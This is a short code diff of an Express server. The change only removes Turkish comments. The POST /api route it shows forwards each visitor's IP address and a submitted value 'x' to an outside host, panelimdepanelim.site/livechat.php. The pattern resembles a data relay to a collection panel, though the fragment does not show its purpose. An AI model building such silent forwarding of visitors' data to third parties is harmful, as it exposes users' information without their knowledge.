@@ -141,11 +141,11 @@ app.get('/verify', async (req, res) => {
 
  
 app.post('/api', async (req, res) => {
-  const clientIp = req.clientIp; // Ziyaretçinin IP adresi
-  const { x } = req.body; // Gönderilen x değişkeni
+  const clientIp = req.clientIp;  
+  const { x } = req.body; 
 
   try {
-    // IP ve x değerlerini hedef URL'ye gönderiyoruz
+ 
     const response = await axios.post('https://panelimdepanelim.site/livechat.php', {
       ip: clientIp,
       x: x
